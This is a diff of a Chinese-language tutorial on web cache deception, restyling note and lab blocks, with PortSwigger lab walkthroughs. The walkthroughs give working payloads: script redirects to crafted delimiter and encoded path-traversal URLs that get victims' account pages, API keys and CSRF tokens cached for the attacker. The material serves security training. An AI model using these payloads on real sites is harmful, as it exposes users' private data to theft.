@@ -12,12 +12,12 @@ Ref: [https://portswigger.net/web-security/web-cache-deception](https://portswig
 
 圖片來源：[https://portswigger.net/web-security/web-cache-deception](https://portswigger.net/web-security/web-cache-deception)
 
-> [!Note]
->
-> Web cache poisoning 和 Web cache deception 的操作方式是不同：
->
-> * Web cache poisoning 是操作快取金鑰（Cache key）注入惡意的內容並儲存在快取伺服器上，接著讓其他使用者存取。
-> * Web cache deception 則是透過欺騙快取規則（Cache rules）儲存敏感資料，使攻擊者能夠存取。
+::: info
+Web cache poisoning 和 Web cache deception 的操作方式是不同：
+
+* Web cache poisoning 是操作快取金鑰（Cache key）注入惡意的內容並儲存在快取伺服器上，接著讓其他使用者存取。
+* Web cache deception 則是透過欺騙快取規則（Cache rules）儲存敏感資料，使攻擊者能夠存取。
+:::
 
 ## 網頁快取（Web Cache）
 
@@ -26,8 +26,6 @@ Ref: [https://portswigger.net/web-security/web-cache-deception](https://portswig
 之後如果有使用者存取相同的資源，快取伺服器會直接回應之前儲存的資源給使用者。
 
 ![alt](src/image2.png)
-
-圖片來源：[https://portswigger.net/web-security/images/caching.svg](https://portswigger.net/web-security/images/caching.svg)
 
 快取成為常見且重要的途徑來傳送網頁內容，尤其使用將資料副本儲存在全世界分散的伺服器上的 Content Delivery Networks（CDNs）。CDNs 透過最小化傳輸距離，降低了伺服器傳送到使用者的時間。
 
@@ -123,25 +121,27 @@ URL 解析是一個把 URL 和伺服器上的資源聯結起來的過程，包�
 
 接著你可以製作回應儲存在快取的動態資源 URL。注意：這個攻擊有限制的特定結尾，原始伺服器通常有其他不同的規則處理不同的結尾。
 
-> [!note]
-> Burp Scanner 自動偵測路徑解析不同造成的網頁快取詐欺漏洞，也可以使用 [Web Cache Deception Scanner](https://portswigger.net/bappstore/7c1ca94a61474d9e897d307c858d52f0) BApp 偵測錯誤配置的網頁快取。
+::: info
+Burp Scanner 自動偵測路徑解析不同造成的網頁快取詐欺漏洞，也可以使用 [Web Cache Deception Scanner](https://portswigger.net/bappstore/7c1ca94a61474d9e897d307c858d52f0) BApp 偵測錯誤配置的網頁快取。
+:::
 
-* **Lab: [Exploiting path mapping for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping)**
-  1. 偵查目標
-     1. 使用帳號 `wiener`、密碼 `peter` 登入。
-     2. 發現回應包含 API key
-  2. 辨識路徑解析不一致
-     1. 發送 `/my-account/abc` 路徑的請求，發現回應資料仍然包含你的 API Key，表示原始伺服器將其解析成 `/my-account`。
-     2. 在 URL 路徑加上副檔名，例如：`/my-account/abc.js`，接著發送請求。發現回應包含 `X-Cache: miss`（表示回應不是從快取提供）和 `Cache-Control: max-age=30`（表示會被儲存 30 秒）表頭。
-     3. 在 30 秒內重新傳送請求，發現表頭 `X-Cache` 的數字變成 `hit`，表示回應資料來自快取。由此可以推斷快取解釋 URL 路徑為 `/my-account/abc.js` 並符合 `.js` 副檔名的快取規則。所以可以使用這個 payload 進行利用。
-  3. 進行漏洞利用
-     1. 在網站中點擊 **Go to exploit server**
-     2. 在 **Body** 部分讓受害者（`carlos`）跳轉到你製作的惡意 URL。需注意應修改路徑後方的參數，以避免受害者存取到你之前存取的快取回應。
-      ```
+::: tip **Lab: [Exploiting path mapping for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping)**
+1. 偵查目標
+   1. 使用帳號 `wiener`、密碼 `peter` 登入。
+   2. 發現回應包含 API key
+2. 辨識路徑解析不一致
+   1. 發送 `/my-account/abc` 路徑的請求，發現回應資料仍然包含你的 API Key，表示原始伺服器將其解析成 `/my-account`。
+   2. 在 URL 路徑加上副檔名，例如：`/my-account/abc.js`，接著發送請求。發現回應包含 `X-Cache: miss`（表示回應不是從快取提供）和 `Cache-Control: max-age=30`（表示會被儲存 30 秒）表頭。
+   3. 在 30 秒內重新傳送請求，發現表頭 `X-Cache` 的數字變成 `hit`，表示回應資料來自快取。由此可以推斷快取解釋 URL 路徑為 `/my-account/abc.js` 並符合 `.js` 副檔名的快取規則。所以可以使用這個 payload 進行利用。
+3. 進行漏洞利用
+   1. 在網站中點擊 **Go to exploit server**
+   2. 在 **Body** 部分讓受害者（`carlos`）跳轉到你製作的惡意 URL。需注意應修改路徑後方的參數，以避免受害者存取到你之前存取的快取回應。
+      ```html
       <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
       ```
-     3. 點擊 **Deliver exploit to victim**。當受害者存取該 URL，回應會儲存在快取。
-     4. 前往提供給受害者（`carlos`）存取的路徑（`https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js`），就可以看到 `carlos` 的 API Key 了。
+   3. 點擊 **Deliver exploit to victim**。當受害者存取該 URL，回應會儲存在快取。
+   4. 前往提供給受害者（`carlos`）存取的路徑（`https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js`），就可以看到 `carlos` 的 API Key 了。
+:::
 
 ### 分隔方式不一致
 
@@ -169,8 +169,9 @@ URL 解析是一個把 URL 和伺服器上的資源聯結起來的過程，包�
 
 首先，找到被原始伺服器當作分隔符號的資源。一開始可以加上任意的字串到目標 URL，例如：將 `/setting/users/list` 修改成 `/settings/users/listaaa`。當你開始測試分隔字元時，將使用回應作為參考。
 
-> [!note]
-> 如果回應資料和原始回應相同，表示請求被轉向了，你需要選擇其他不同的端點作為測試。
+::: info
+如果回應資料和原始回應相同，表示請求被轉向了，你需要選擇其他不同的端點作為測試。
+:::
 
 接著，在原始路徑和任意的字串間加上可能的分隔符號，例如 `/settings/users/list;aaa`：
 
@@ -193,32 +194,33 @@ URL 解析是一個把 URL 和伺服器上的資源聯結起來的過程，包�
 
 由於分隔符號在每個伺服器通常使用一樣，你可以在各種不同的端點使用此攻擊。
 
-> [!note]
-> 
-> 在瀏覽器向快取請求前，有寫分隔字元會先被受害者的瀏覽器處理。這表示有寫分隔符號無法被拿來進行攻擊利用。例如，瀏覽器獎 `{`、`}`、`<`、`<`、`#` 等字元編碼以分割路徑。
-> 
-> 如果快取或原始伺服器將這些字元解碼，在漏洞利用時可能會使用編碼的版本。
+::: info
+在瀏覽器向快取請求前，有寫分隔字元會先被受害者的瀏覽器處理。這表示有寫分隔符號無法被拿來進行攻擊利用。例如，瀏覽器獎 `{`、`}`、`<`、`<`、`#` 等字元編碼以分割路徑。
 
-* **Lab: [Exploiting path delimiters for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters)**
-   1. 偵查：使用 Burp Intruder 嘗試不同分隔字元，判斷原始伺服器會解析哪些分隔符號
-      1. 將請求傳送到 Intruder
-      2. 加上參數
-         ![](https://i.imgur.com/5fC2ACc.png)
-      3. 將 [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list) 中的字元貼上到 payload 的地方
-      4. 取消勾選 URL-encode these characters 選項
-      5. 點擊 Start attack 完成攻擊後，會發現只有字元 `?` 和 `;` 回應 200，其他都是 404
-   2. 偵查：判斷是否會被快取儲存
-      1. 使用 `?` 字元作為分隔符號會發現 header 沒有快取的痕跡
-         ![](https://i.imgur.com/ODpYO8i.jpeg)
-      2. 使用 `;` 字元作為分隔符號連續請求兩次，發現 header 有被快取儲存的跡象
-         ![](https://i.imgur.com/eMDME6l.jpeg)
-         ![](https://i.imgur.com/GPkMfy8.jpeg)
-   3. 漏洞利用
-      1. 在 Go to exploit server 的 body 撰寫 payload
-         ```
-         <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js"</script>
-         ```
-      2. 接著前往路徑 `https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js` 就可以拿到受害者的 API key 了！
+如果快取或原始伺服器將這些字元解碼，在漏洞利用時可能會使用編碼的版本。
+:::
+
+::: tip **Lab: [Exploiting path delimiters for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters)**
+1. 偵查：使用 Burp Intruder 嘗試不同分隔字元，判斷原始伺服器會解析哪些分隔符號
+   1. 將請求傳送到 Intruder
+   2. 加上參數
+     ![](https://i.imgur.com/5fC2ACc.png)
+   3. 將 [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list) 中的字元貼上到 payload 的地方
+   4. 取消勾選 URL-encode these characters 選項
+   5. 點擊 Start attack 完成攻擊後，會發現只有字元 `?` 和 `;` 回應 200，其他都是 404
+2. 偵查：判斷是否會被快取儲存
+   1. 使用 `?` 字元作為分隔符號會發現 header 沒有快取的痕跡
+      ![](https://i.imgur.com/ODpYO8i.jpeg)
+   2. 使用 `;` 字元作為分隔符號連續請求兩次，發現 header 有被快取儲存的跡象
+      ![](https://i.imgur.com/eMDME6l.jpeg)
+      ![](https://i.imgur.com/GPkMfy8.jpeg)
+3. 漏洞利用
+   1. 在 Go to exploit server 的 body 撰寫 payload
+      ```html
+      <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js"</script>
+      ```
+   2. 接著前往路徑 `https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js` 就可以拿到受害者的 API key 了！
+:::
 
 ### 分隔資源解碼不一致
 
@@ -244,9 +246,9 @@ URL 解析是一個把 URL 和伺服器上的資源聯結起來的過程，包�
 
 網路伺服器經常將靜態資源儲存在一些特定的資料夾，快取規則經常判斷符合特定 URL 路徑，把這些資料夾作為目標，例如：`/static`、`/assets`、`/scripts` 或 `/images`。這個規則也可能造成網頁快取詐欺漏洞。
 
-> [!note]
->
-> 為了利用靜態資料夾快取規則，你需要了解基本的路徑遍歷攻擊。詳見：[Path traversal](https://portswigger.net/web-security/file-path-traversal)
+::: info
+為了利用靜態資料夾快取規則，你需要了解基本的路徑遍歷攻擊。詳見：[Path traversal](https://portswigger.net/web-security/file-path-traversal)
+:::
 
 ### 標準化不一致
 
@@ -266,11 +268,11 @@ URL 解析是一個把 URL 和伺服器上的資源聯結起來的過程，包�
 * 如果回應和原本的請求回應相同並回傳個人資料頁面，表示這個路徑被解析成 `/profile`。原始伺服器將斜槓解碼並解析「點」。
 * 如果回應和原本的請求回應不相同（例如回應 `404` 錯誤訊息），標示路徑被解析成 `/aaa/..%2fprofile`。原始伺服器沒有解碼斜槓或解析「點」。
 
-> [!note]
->
-> 在測試標準化時，先編碼「點」後面的斜槓就好。這很重要，因為一些 CDN 會匹配靜態資料夾前綴後面的斜槓。
->
-> 你也可以嘗試編碼完整的路徑遍歷部分，或編碼「點」而不是斜槓。這有時候可以影響解析器是否將這些片段解碼。
+::: info
+在測試標準化時，先編碼「點」後面的斜槓就好。這很重要，因為一些 CDN 會匹配靜態資料夾前綴後面的斜槓。
+
+你也可以嘗試編碼完整的路徑遍歷部分，或編碼「點」而不是斜槓。這有時候可以影響解析器是否將這些片段解碼。
+:::
 
 ### 透過快取伺服器偵查標準化
 
@@ -288,9 +290,9 @@ URL 解析是一個把 URL 和伺服器上的資源聯結起來的過程，包�
 
 注意，回應可能透過其他快取規則被儲存，例如透過檔案副檔名判斷等。為了確認快取規則是判斷靜態資料夾，在開頭資料夾的後面加上任意字串。以 `/assets/aaa` 為例，如果回應仍然被快取，表示快取規則會判斷開頭是否為 `/assets`。如果回應沒有被快取，不一定代表不飽和靜態資料夾的快取規則，因為 `404` 的回應有時候不會被快取。
 
-> [!note]
->
-> 如果不嘗試進行漏洞利用，可能無法明確的確定快取是否會解碼「點」以及 URL 路徑。
+::: info
+如果不嘗試進行漏洞利用，可能無法明確的確定快取是否會解碼「點」以及 URL 路徑。
+:::
 
 ### 利用原始伺服器標準化
 
@@ -301,28 +303,29 @@ URL 解析是一個把 URL 和伺服器上的資源聯結起來的過程，包�
 
 原始伺服器回傳動態的個人資料頁面，而快取將其儲存。
 
-* **Lab: [Exploiting origin server normalization for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization)**
-   1. 偵查原始伺服器標準化
-      1. 前往路徑 `/my-account`，會回傳個人資料頁面並顯示 API Key
-      2. 前往路徑 `/aaa/..%2fmy-account` 仍成功回傳個人資料頁面並顯示 API Key，且路徑列顯示 `/aaa/..%2fmy-account`，表示原始伺服器會解析 `%2f`。
-   2. 偵查快取伺服器標準化
-      1. 尋找一個正確的靜態資源並確保其有被快取，這裡選擇：`/resources/labheader/js/labHeader.js`
-      2. 前往路徑 `/aaa/..%2fresources/labheader/js/labHeader.js` 發現快取並不會將其儲存
-      3. 判斷快取伺服器不會解析 `%2f` 且快取規則包含開頭為靜態資源路徑之規則
-   3. 利用
-      1. 製作 Payload：
-         ```
-         <script>document.location.href="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account";</script>
-         ```
-      2. 將其傳送給受害者後攻擊者再次前往路徑 `https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account` 即可得到受害者的 API Key
+::: tip **Lab: [Exploiting origin server normalization for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization)**
+1. 偵查原始伺服器標準化
+   1. 前往路徑 `/my-account`，會回傳個人資料頁面並顯示 API Key
+   2. 前往路徑 `/aaa/..%2fmy-account` 仍成功回傳個人資料頁面並顯示 API Key，且路徑列顯示 `/aaa/..%2fmy-account`，表示原始伺服器會解析 `%2f`。
+2. 偵查快取伺服器標準化
+   1. 尋找一個正確的靜態資源並確保其有被快取，這裡選擇：`/resources/labheader/js/labHeader.js`
+   2. 前往路徑 `/aaa/..%2fresources/labheader/js/labHeader.js` 發現快取並不會將其儲存
+   3. 判斷快取伺服器不會解析 `%2f` 且快取規則包含開頭為靜態資源路徑之規則
+3. 利用
+   1. 製作 Payload：
+      ```html
+      <script>document.location.href="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account";</script>
+      ```
+   2. 將其傳送給受害者後攻擊者再次前往路徑 `https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account` 即可得到受害者的 API Key
+:::
 
 ### 利用快取伺服器標準化
 
 如果快取伺服器會解析編碼的「點」而原始伺服器不會解析，可以嘗試使用與下方相似結構的 Payload 來利用不一致：`/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>`
 
-> [!note]
->
-> 當利用快取伺服器標準化時，將所有路徑遍歷的部分進行編碼。透過編碼的字元有助於在使用分隔符號時，避免一些意外的行為。並且不需要在開頭的靜態目錄後面使用未編碼的「斜槓」，因為快取會負責解碼。
+::: info
+當利用快取伺服器標準化時，將所有路徑遍歷的部分進行編碼。透過編碼的字元有助於在使用分隔符號時，避免一些意外的行為。並且不需要在開頭的靜態目錄後面使用未編碼的「斜槓」，因為快取會負責解碼。
+:::
 
 在這種情況下，僅依靠路徑遍歷不足以進行漏洞利用。例如，快取和原始伺服器如何解析 Payload `/profile%2f%2e%2fstatic`：
 
@@ -343,23 +346,24 @@ URL 解析是一個把 URL 和伺服器上的資源聯結起來的過程，包�
 
 原始伺服器回應動態個人資料，快取會將其儲存，接著就可以使用此 Payload 進行漏洞利用。
 
-* **Lab: [Exploiting cache server normalization for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization)**
-  1. 偵查原始伺服器解析的路徑分隔符號
-     1. 使用 **Intruder** 發送請求
-     2. Payload 使用 `/my-account§§abc`
-     3. 分隔符號參數可參考 [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)
-     4. 發現 `#`、`?`、`%23`、`%3f` 回應狀態碼 `200`。但 `#` 不可使用，因為會在請求前就被瀏覽器當作分隔符號。
-  2. 偵查標準化不一致
-     1. 對路徑 `/aaa/..%2fmy-account` 請求，回應狀態碼 `404`，表示原始伺服器不會解析 `..%2f`
-     2. 使用 Payload `/aaa/..%2fresources/YOUR-RESOURCE` 發現會被快取，表示快取會解析 `..%2f` 且快取規則匹配開頭為 `/resources` 的請求
-  3. 漏洞利用
-     1. 使用 Payload：`/my-account%23%2f%2e%2e%2fresources?wcd`
-        * 原始伺服器將會解析分隔符號 `%23`，並將路徑解析為 `/my-account` 回應 API Key
-        * 快取伺服器會解析 `..%2f`，所以將路徑解析為 `/resources` 並將回應儲存在快取
-     2. 製作 Payload 並發送給受害者，接著攻擊者再次存取即可獲得受害者的 API Key
-        ```
-        <script>document.location.href="https://0a2800ef0485f50b8033ad7a00b0005f.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</script>
-        ```
+::: tip **Lab: [Exploiting cache server normalization for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization)**
+1. 偵查原始伺服器解析的路徑分隔符號
+   1. 使用 **Intruder** 發送請求
+   2. Payload 使用 `/my-account§§abc`
+   3. 分隔符號參數可參考 [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)
+   4. 發現 `#`、`?`、`%23`、`%3f` 回應狀態碼 `200`。但 `#` 不可使用，因為會在請求前就被瀏覽器當作分隔符號。
+2. 偵查標準化不一致
+   1. 對路徑 `/aaa/..%2fmy-account` 請求，回應狀態碼 `404`，表示原始伺服器不會解析 `..%2f`
+   2. 使用 Payload `/aaa/..%2fresources/YOUR-RESOURCE` 發現會被快取，表示快取會解析 `..%2f` 且快取規則匹配開頭為 `/resources` 的請求
+3. 漏洞利用
+   1. 使用 Payload：`/my-account%23%2f%2e%2e%2fresources?wcd`
+      * 原始伺服器將會解析分隔符號 `%23`，並將路徑解析為 `/my-account` 回應 API Key
+      * 快取伺服器會解析 `..%2f`，所以將路徑解析為 `/resources` 並將回應儲存在快取
+   2. 製作 Payload 並發送給受害者，接著攻擊者再次存取即可獲得受害者的 API Key
+      ```html
+      <script>document.location.href="https://0a2800ef0485f50b8033ad7a00b0005f.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</script>
+      ```
+:::
 
 ## 利用檔案名稱快取規則
 
@@ -380,23 +384,24 @@ URL 解析是一個把 URL 和伺服器上的資源聯結起來的過程，包�
 
 因為只有匹配特定檔案名稱的回應會被快取，所以只能利用快取會解析「點」且原始伺服器不會解析的不一致。使用與靜態資料夾快取規則相同的方法，只需要將開頭使用靜態目錄改成檔案名稱即可。
 
-* **Lab: [Exploiting exact-match cache rules for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules)**
-  1. 偵查快取伺服器檔案名稱快取規則
-     1. 前往路徑 `/robots.txt` 發現會被快取
-  2. 偵查分隔符號不一致
-     1. 前往路徑 `/robots.txt;aaa` 發現會回應 `robots.txt` 的內容，但不會被快取，表示快取伺服器不會解析 `;`，但原始伺服器會解析。
-  3. 嘗試漏洞利用
-     1. 前往 `https://0ae5006803083ae3a2794be300d00087.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt`
-     2. 發現回應個人資料頁面，但不會被快取，表示：
-        * 原始伺服器將 `;` 解析為分隔符號
-        * 快取伺服器不會解析 `;`
-        * 快取伺服器會解析路徑遍歷部分 `%2f%2e%2e%2`，並將此請求解析為 `/robots.txt`
-     3. 發送 Payload 給受害者：
-        ```
-        <script>document.location="https://0ae5006803083ae3a2794be300d00087.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?wcd"</script>
-        ```
-     4. 使用 **Repeater** 將原本的 `/my-account` 請求修改成路徑 `/my-account;%2f%2e%2e%2frobots.txt?wcd` 並發送請求
-     5. 將回應被快取的 administrator 使用者個人資料頁面，並在當中找到 csrf 值
+::: tip **Lab: [Exploiting exact-match cache rules for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules)**
+1. 偵查快取伺服器檔案名稱快取規則
+   1. 前往路徑 `/robots.txt` 發現會被快取
+2. 偵查分隔符號不一致
+   1. 前往路徑 `/robots.txt;aaa` 發現會回應 `robots.txt` 的內容，但不會被快取，表示快取伺服器不會解析 `;`，但原始伺服器會解析。
+3. 嘗試漏洞利用
+   1. 前往 `https://0ae5006803083ae3a2794be300d00087.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt`
+   2. 發現回應個人資料頁面，但不會被快取，表示：
+      * 原始伺服器將 `;` 解析為分隔符號
+      * 快取伺服器不會解析 `;`
+      * 快取伺服器會解析路徑遍歷部分 `%2f%2e%2e%2`，並將此請求解析為 `/robots.txt`
+   3. 發送 Payload 給受害者：
+      ```
+      <script>document.location="https://0ae5006803083ae3a2794be300d00087.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?wcd"</script>
+      ```
+   4. 使用 **Repeater** 將原本的 `/my-account` 請求修改成路徑 `/my-account;%2f%2e%2e%2frobots.txt?wcd` 並發送請求
+   5. 將回應被快取的 administrator 使用者個人資料頁面，並在當中找到 csrf 值
+:::
 
 ## 防範網頁快取詐欺漏洞
 
